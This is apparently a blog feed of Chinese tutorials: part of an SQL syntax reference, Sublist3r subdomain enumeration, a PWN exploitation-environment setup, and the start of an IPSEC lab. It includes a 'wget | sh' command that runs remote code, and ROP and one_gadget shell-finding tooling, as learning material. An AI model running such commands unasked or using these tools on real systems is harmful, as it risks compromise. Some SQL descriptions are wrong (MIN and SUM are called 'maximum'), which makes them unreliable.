<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT TOP 1 column_name FROM table_name</span><br><span class="line">ORDER BY column_name DESC;</span><br><span class="line">SELECT TOP 1 name FROM Websites</span><br><span class="line">ORDER BY id DESC;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>MySQL 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name FROM table_name</span><br><span class="line">ORDER BY column_name DESC</span><br><span class="line">LIMIT 1;</span><br><span class="line">SELECT name FROM Websites</span><br><span class="line">ORDER BY id DESC</span><br><span class="line">LIMIT 1;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Oracle 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name FROM table_name</span><br><span class="line">ORDER BY column_name DESC</span><br><span class="line">WHERE ROWNUM &lt;=1;</span><br><span class="line">SELECT name FROM Websites</span><br><span class="line">ORDER BY id DESC</span><br><span class="line">WHERE ROWNUM &lt;=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="MAX-函数"><a href="#MAX-函数" class="headerlink" title="MAX() 函数"></a>MAX() 函数</h3><p>返回指定列的最大值。</p>
<p><strong>SQL MAX() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MAX(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="MIN-函数"><a href="#MIN-函数" class="headerlink" title="MIN() 函数"></a>MIN() 函数</h3><p>返回指定列的最大值。</p>
<p><strong>SQL MIN() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MIN(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="SUM-函数"><a href="#SUM-函数" class="headerlink" title="SUM() 函数"></a>SUM() 函数</h3><p>返回指定列的最大值。</p>
<p><strong>SQL SUM() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT SUM(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h3><p>用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<p><strong>SQL GROUP BY 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name, aggregate_function(column_name)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br><span class="line">GROUP BY column_name;</span><br></pre></td></tr></table></figure>

<h3 id="HAVING-子句"><a href="#HAVING-子句" class="headerlink" title="HAVING 子句"></a>HAVING 子句</h3><p>在 SQL 中增加 HAVING 子句原因是，WHERE 关键字无法与聚合函数一起使用。</p>
<p>HAVING 子句可以在筛选分组后的各组数据。</p>
<p><strong>SQL HAVING 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name, aggregate_function(column_name) </span><br><span class="line">FROM table_name </span><br><span class="line">WHERE column_name operator value </span><br><span class="line">GROUP BY column_name </span><br><span class="line">HAVING aggregate_function(column_name) operator value;</span><br></pre></td></tr></table></figure>

<h3 id="EXISTS-运算符"><a href="#EXISTS-运算符" class="headerlink" title="EXISTS 运算符"></a>EXISTS 运算符</h3><p>用于判断查询子句是否有记录，如果有一条或多条记录存在返回 True，否则返回 False。</p>
<p><strong>SQL EXISTS 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE EXISTS</span><br><span class="line">(SELECT column_name FROM table_name WHERE condition);</span><br></pre></td></tr></table></figure>

<h3 id="UCASE-函数"><a href="#UCASE-函数" class="headerlink" title="UCASE() 函数"></a>UCASE() 函数</h3><p>把字段的值转换为大写。</p>
<p><strong>SQL UCASE() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT UCASE(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>用于 SQL Server 的语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT UPPER(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="LCASE-函数"><a href="#LCASE-函数" class="headerlink" title="LCASE() 函数"></a>LCASE() 函数</h3><p>把字段的值转换为小写。</p>
<p><strong>SQL LCASE() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LCASE(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>用于 SQL Server 的语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LOWER(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="MID-函数"><a href="#MID-函数" class="headerlink" title="MID() 函数"></a>MID() 函数</h3><p>用于从文本字段中提取字符。</p>
<p><strong>SQL MID() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">column_name</td>
<td align="left">必需。要提取字符的字段。</td>
</tr>
<tr>
<td align="left">start</td>
<td align="left">必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td align="left">length</td>
<td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<h3 id="LEN-函数"><a href="#LEN-函数" class="headerlink" title="LEN() 函数"></a>LEN() 函数</h3><p>返回文本字段中值的长度。</p>
<p><strong>SQL LEN() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LEN(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<p>MySQL 中函数为 LENGTH():</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT LENGTH(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="ROUND-函数"><a href="#ROUND-函数" class="headerlink" title="ROUND() 函数"></a>ROUND() 函数</h3><p>用于把数值字段舍入为指定的小数位数。</p>
<p><strong>SQL ROUND() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ROUND(column_name,decimals) FROM table_name;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">column_name</td>
<td align="left">必需。要舍入的字段。</td>
</tr>
<tr>
<td align="left">decimals</td>
<td align="left">必需。规定要返回的小数位数。</td>
</tr>
</tbody></table>
<h3 id="NOW-函数"><a href="#NOW-函数" class="headerlink" title="NOW() 函数"></a>NOW() 函数</h3><p>返回当前系统的日期和时间。</p>
<p><strong>SQL NOW() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT NOW() FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="FORMAT-函数"><a href="#FORMAT-函数" class="headerlink" title="FORMAT() 函数"></a>FORMAT() 函数</h3><p>用于对字段的显示进行格式化。</p>
<p><strong>SQL FORMAT() 语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT FORMAT(column_name,format) FROM table_name;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">column_name</td>
<td align="left">必需。要格式化的字段。</td>
</tr>
<tr>
<td align="left">format</td>
<td align="left">必需。规定格式。</td>
</tr>
</tbody></table>
<h2 id="附：SQL语法查看表"><a href="#附：SQL语法查看表" class="headerlink" title="附：SQL语法查看表"></a>附：SQL语法查看表</h2><table>
<thead>
<tr>
<th align="left">SQL 语句</th>
<th align="left">语法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AND / OR</td>
<td align="left">SELECT column_name(s) FROM table_name WHERE condition AND|OR condition</td>
</tr>
<tr>
<td align="left">ALTER TABLE</td>
<td align="left">ALTER TABLE table_name ADD column_name datatypeorALTER TABLE table_name DROP COLUMN column_name</td>
</tr>
<tr>
<td align="left">AS (alias)</td>
<td align="left">SELECT column_name AS column_alias FROM table_nameorSELECT column_name FROM table_name AS table_alias</td>
</tr>
<tr>
<td align="left">BETWEEN</td>
<td align="left">SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2</td>
</tr>
<tr>
<td align="left">CREATE DATABASE</td>
<td align="left">CREATE DATABASE database_name</td>
</tr>
<tr>
<td align="left">CREATE TABLE</td>
<td align="left">CREATE TABLE table_name ( column_name1 data_type, column_name2 data_type, column_name2 data_type, … )</td>
</tr>
<tr>
<td align="left">CREATE INDEX</td>
<td align="left">CREATE INDEX index_name ON table_name (column_name)orCREATE UNIQUE INDEX index_name ON table_name (column_name)</td>
</tr>
<tr>
<td align="left">CREATE VIEW</td>
<td align="left">CREATE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition</td>
</tr>
<tr>
<td align="left">DELETE</td>
<td align="left">DELETE FROM table_name WHERE some_column=some_valueorDELETE FROM table_name (<strong>Note:</strong> Deletes the entire table!!)DELETE * FROM table_name (<strong>Note:</strong> Deletes the entire table!!)</td>
</tr>
<tr>
<td align="left">DROP DATABASE</td>
<td align="left">DROP DATABASE database_name</td>
</tr>
<tr>
<td align="left">DROP INDEX</td>
<td align="left">DROP INDEX table_name.index_name (SQL Server) DROP INDEX index_name ON table_name (MS Access) DROP INDEX index_name (DB2/Oracle) ALTER TABLE table_name DROP INDEX index_name (MySQL)</td>
</tr>
<tr>
<td align="left">DROP TABLE</td>
<td align="left">DROP TABLE table_name</td>
</tr>
<tr>
<td align="left">GROUP BY</td>
<td align="left">SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name</td>
</tr>
<tr>
<td align="left">HAVING</td>
<td align="left">SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING aggregate_function(column_name) operator value</td>
</tr>
<tr>
<td align="left">IN</td>
<td align="left">SELECT column_name(s) FROM table_name WHERE column_name IN (value1,value2,..)</td>
</tr>
<tr>
<td align="left">INSERT INTO</td>
<td align="left">INSERT INTO table_name VALUES (value1, value2, value3,….)<em>or</em>INSERT INTO table_name (column1, column2, column3,…) VALUES (value1, value2, value3,….)</td>
</tr>
<tr>
<td align="left">INNER JOIN</td>
<td align="left">SELECT column_name(s) FROM table_name1 INNER JOIN table_name2 ON table_name1.column_name=table_name2.column_name</td>
</tr>
<tr>
<td align="left">LEFT JOIN</td>
<td align="left">SELECT column_name(s) FROM table_name1 LEFT JOIN table_name2 ON table_name1.column_name=table_name2.column_name</td>
</tr>
<tr>
<td align="left">RIGHT JOIN</td>
<td align="left">SELECT column_name(s) FROM table_name1 RIGHT JOIN table_name2 ON table_name1.column_name=table_name2.column_name</td>
</tr>
<tr>
<td align="left">FULL JOIN</td>
<td align="left">SELECT column_name(s) FROM table_name1 FULL JOIN table_name2 ON table_name1.column_name=table_name2.column_name</td>
</tr>
<tr>
<td align="left">LIKE</td>
<td align="left">SELECT column_name(s) FROM table_name WHERE column_name LIKE pattern</td>
</tr>
<tr>
<td align="left">ORDER BY</td>
<td align="left">SELECT column_name(s) FROM table_name ORDER BY column_name [ASC|DESC]</td>
</tr>
<tr>
<td align="left">SELECT</td>
<td align="left">SELECT column_name(s) FROM table_name</td>
</tr>
<tr>
<td align="left">SELECT *</td>
<td align="left">SELECT * FROM table_name</td>
</tr>
<tr>
<td align="left">SELECT DISTINCT</td>
<td align="left">SELECT DISTINCT column_name(s) FROM table_name</td>
</tr>
<tr>
<td align="left">SELECT INTO</td>
<td align="left">SELECT * INTO new_table_name [IN externaldatabase] FROM old_table_name<em>or</em>SELECT column_name(s) INTO new_table_name [IN externaldatabase] FROM old_table_name</td>
</tr>
<tr>
<td align="left">SELECT TOP</td>
<td align="left">SELECT TOP number|percent column_name(s) FROM table_name</td>
</tr>
<tr>
<td align="left">TRUNCATE TABLE</td>
<td align="left">TRUNCATE TABLE table_name</td>
</tr>
<tr>
<td align="left">UNION</td>
<td align="left">SELECT column_name(s) FROM table_name1 UNION SELECT column_name(s) FROM table_name2</td>
</tr>
<tr>
<td align="left">UNION ALL</td>
<td align="left">SELECT column_name(s) FROM table_name1 UNION ALL SELECT column_name(s) FROM table_name2</td>
</tr>
<tr>
<td align="left">UPDATE</td>
<td align="left">UPDATE table_name SET column1=value, column2=value,… WHERE some_column=some_value</td>
</tr>
<tr>
<td align="left">WHERE</td>
<td align="left">SELECT column_name(s) FROM table_name WHERE column_name operator value</td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.runoob.com/sql/sql-tutorial.html">https://www.runoob.com/sql/sql-tutorial.html</a></p>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublist3r基础使用教程</title>
    <url>/Sublist3r%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Sublist3r是一个用Python编写的子域发现工具，旨在使用来自公共资源和暴力技术的数据枚举网站的子域。公共资源包括广泛的流行搜索引擎，如谷歌、雅虎、必应、百度、Ask以及Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS，以发现子域名。<span id="more"></span></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>从GitHub仓库克隆python代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/aboul3la/Sublist3r.git</span><br></pre></td></tr></table></figure>

<p>进入目录Sublist3r，安装依赖项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>执行如下命令查看使用说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -h</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201103202729.png"></p>
<p>参数说明：</p>
<table>
<thead>
<tr>
<th>简写</th>
<th>长表</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>–domain</td>
<td>枚举子域名的域名</td>
</tr>
<tr>
<td>-b</td>
<td>–bruteforce</td>
<td>启用subbrute bruteforce模块</td>
</tr>
<tr>
<td>-p</td>
<td>–port</td>
<td>针对特定的TCP端口扫描找到的子域</td>
</tr>
<tr>
<td>-v</td>
<td>–verbose</td>
<td>启用详细模式并实时显示结果</td>
</tr>
<tr>
<td>-t</td>
<td>–threads</td>
<td>用于subbrute bruteforce的线程数</td>
</tr>
<tr>
<td>-e</td>
<td>–engines</td>
<td>指定以逗号分隔的搜索引擎列表</td>
</tr>
<tr>
<td>-o</td>
<td>–output</td>
<td>将结果保存到文本文件</td>
</tr>
<tr>
<td>-h</td>
<td>–help</td>
<td>显示帮助信息并退出</td>
</tr>
</tbody></table>
<ol>
<li><p>枚举特定域的子域</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -d example.com</span><br></pre></td></tr></table></figure></li>
<li><p>枚举特定域的子域并仅显示具有开放端口80和443的子域</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -d example.com -p 80,443</span><br></pre></td></tr></table></figure></li>
<li><p>枚举特定域的子域并实时显示结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -v -d example.com</span><br></pre></td></tr></table></figure></li>
<li><p>枚举子域并启用bruteforce模块并启动10个线程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -b -d example.com -t 10</span><br></pre></td></tr></table></figure></li>
<li><p>枚举子域并使用特定引擎，例如Google，Yahoo和Virustotal引擎</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sublist3r.py -e google,yahoo,virustotal -d example.com</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>InformationGathering</tag>
        <tag>subdomain blasting</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下PWN环境配置小结</title>
    <url>/Ubuntu%E4%B8%8BPWN%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%B0%8F%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>简单梳理Pwn环境的搭建过程。<span id="more"></span></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol>
<li>  Ubuntu 16.04.7</li>
<li>  Python 3.5.2</li>
<li>  Python 2.7.12</li>
</ol>
<h1 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>一个ctf框架和漏洞利用python库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3 </span></span><br><span class="line">sudo apt-get install python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">sudo apt-get install python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>动态调试软件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure>

<h2 id="peda-gef-pwndbg"><a href="#peda-gef-pwndbg" class="headerlink" title="peda/gef/pwndbg"></a>peda/gef/pwndbg</h2><p>gdb的三个插件，配合gdb使用可以提升调试效率。</p>
<ol>
<li><p>peda</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br></pre></td></tr></table></figure></li>
<li><p>gef</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">wget -q -O ~/gef/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py</span><br></pre></td></tr></table></figure></li>
<li><p>pwndbg</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg ~/pwndbg</span><br><span class="line"><span class="built_in">cd</span> ~/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></li>
</ol>
<p>在同一时刻只能使用一种插件，而且在解决不同类型的题目时使用不同的插件，因此需要配置三种插件的快捷切换。</p>
<ul>
<li><p>  找到文件<code>.gdbinit</code>，一般在根目录下，一般安装好pwndbg之后出现，内容为<code>source ～/pwndbg/gdbinit.py</code>，上述语句控制gdb使用的插件类型。</p>
</li>
<li><p>加一个可以识别的字符串<code>#this place is controled by user's shell</code>，不管是什么，需要注释并且不能与别的位置重复，并且需要把原来的source注释。</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># source ～/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="comment"># this place is controled by user's shell</span></span><br></pre></td></tr></table></figure></li>
<li><p>编写shell脚本：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!gdbstart.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">function</span> Mode_change {</span><br><span class="line">    name=<span class="variable">$1</span></span><br><span class="line">    gdbinitfile=~/.gdbinit    <span class="comment">#路径按实际情况修改</span></span><br><span class="line">    </span><br><span class="line">    peda=<span class="string">"source ~/peda/peda.py"</span>   <span class="comment">#路径按实际情况修改</span></span><br><span class="line">    gef=<span class="string">"source ~/.gef/.gdbinit-gef.py"</span>   <span class="comment">#这个路径按照你的实际情况修改</span></span><br><span class="line">    pwndbg=<span class="string">"source /pwndbg/gdbinit.py"</span>   <span class="comment">#这个路径按照你的实际情况修改</span></span><br><span class="line"> </span><br><span class="line">    sign=$(<span class="built_in">cat</span> <span class="variable">$gdbinitfile</span> | grep -n <span class="string">"#this place is controled by user's shell"</span>)     </span><br><span class="line">           <span class="comment">#此处上面的查找内容要和文件'.gdbinit'保持一致</span></span><br><span class="line"> </span><br><span class="line">    pattern=<span class="string">":#this place is controled by user's shell"</span></span><br><span class="line">    number=<span class="variable">${sign%$pattern}</span></span><br><span class="line">    location=$[number+2]</span><br><span class="line"> </span><br><span class="line">    parameter_add=<span class="variable">${location}</span>i</span><br><span class="line">    parameter_del=<span class="variable">${location}</span>d</span><br><span class="line"> </span><br><span class="line">    message=<span class="string">"TEST"</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$name</span> -eq <span class="string">"1"</span> ];<span class="keyword">then</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_del</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_add</span> <span class="variable">$peda</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">"Please enjoy the peda!\n"</span></span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$name</span> -eq <span class="string">"2"</span> ];<span class="keyword">then</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_del</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_add</span> <span class="variable">$gef</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">"Please enjoy the gef!\n"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_del</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        sed -i <span class="string">"<span class="variable">$parameter_add</span> <span class="variable">$pwndbg</span>"</span> <span class="variable">$gdbinitfile</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">"Please enjoy the pwndbg!\n"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg"</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Input your choice:"</span> num</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$num</span> -eq <span class="string">"1"</span> ];<span class="keyword">then</span></span><br><span class="line">    Mode_change <span class="variable">$num</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$num</span> -eq <span class="string">"2"</span> ];<span class="keyword">then</span></span><br><span class="line">    Mode_change <span class="variable">$num</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$num</span> -eq <span class="string">"3"</span> ];<span class="keyword">then</span></span><br><span class="line">    Mode_change <span class="variable">$num</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">"Error!\nPleasse input right number!"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line">gdb <span class="variable">$1</span> <span class="variable">$2</span> <span class="variable">$3</span> <span class="variable">$4</span> <span class="variable">$5</span> <span class="variable">$6</span> <span class="variable">$7</span> <span class="variable">$8</span> <span class="variable">$9</span></span><br></pre></td></tr></table></figure></li>
<li><p>把shell脚本放到一个环境变量指向的路径里面，随便一个位置即可。</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220304212812.png" style="zoom:80%;"></li>
<li><p>检验效果如下。</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220304214057.png" style="zoom:80%;"></li>
</ul>
<h2 id="32位程序支持"><a href="#32位程序支持" class="headerlink" title="32位程序支持"></a>32位程序支持</h2><p>支持32位程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>

<h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>ARM的PWN环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装qemu</span></span><br><span class="line">sudo apt-get install qemu</span><br><span class="line">sudo apt-get install qemu-system qemu-user-static binfmt-support</span><br><span class="line"><span class="comment"># 安装依赖库</span></span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git</span><br></pre></td></tr></table></figure>

<h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><p>泄露libc库中函数的偏移的库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">sudo python2 setup.py develop</span><br><span class="line">sudo python3 setup.py develop</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, 0X7ff39014bd90)</span><br><span class="line">obj.dump(<span class="string">"system"</span>)       </span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)   </span><br><span class="line">obj.dump(<span class="string">"__libc_start_main_ret"</span>)    </span><br></pre></td></tr></table></figure>

<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>用于寻找gadget。首先需要安装Capstone，一个轻量级的多平台架构支持的反汇编架构。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">ROPgadget --binary elf  --only <span class="string">'pop|ret'</span> | grep <span class="string">'eax'</span></span><br><span class="line">ROPgadget --binary elf --string <span class="string">"/bin/sh"</span></span><br><span class="line">ROPgadget --binary elf  --only <span class="string">'int'</span></span><br></pre></td></tr></table></figure>

<h2 id="one-gatget"><a href="#one-gatget" class="headerlink" title="one_gatget"></a>one_gatget</h2><p>用于寻找寻找libc库中的execve(‘/bin/sh’, NULL, NULL)可以一个gadget就可以getshell的位置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get install ruby2.6 ruby2.6-dev</span><br><span class="line">sudo apt-get install gem</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<p>————————未完待续————————</p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>gdb</tag>
        <tag>PWN环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN配置实验</title>
    <url>/VPN%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>在<code>Windows IPSEC</code>配置实验中，通过抓包工具抓取<code>IKE SA</code>和<code>IPSEC SA</code>建立过程的数据包，并进行分析。</li>
<li>思考：IKE密钥协商过程是否存在安全威胁。</li>
<li><code>PacketTracer</code>里VPN配置实验<span id="more"></span></li>
</ol>
<h1 id="Windows-IPSEC配置"><a href="#Windows-IPSEC配置" class="headerlink" title="Windows IPSEC配置"></a>Windows IPSEC配置</h1><ol>
<li><p>配置环境：<code>windows xp</code> &amp; <code>windows 10</code></p>
</li>
<li><p>打开<code>Windows xp</code>虚拟机，通过<code>secpol.msc</code>打开本地安全设置。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750367517.png" alt="1565750367517"></p>
</li>
<li><p>在IP安全策略下右键，创建安全策略</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750386129.png" alt="1565750386129"></p>
</li>
<li><p>设置配置名称为<code>Levi</code>（个人随意）</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750413150.png" alt="1565750413150"></p>
<p>激活默认响应规则</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750451406.png" alt="1565750451406"></p>
<p>身份认证方法采用<code>此字符串用来保护密钥交换</code>，输入<code>123456</code>（可以换成其他内容）</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750472492.png" alt="1565750472492"></p>
</li>
<li><p>回到原来窗口，鼠标右键，指派</p>
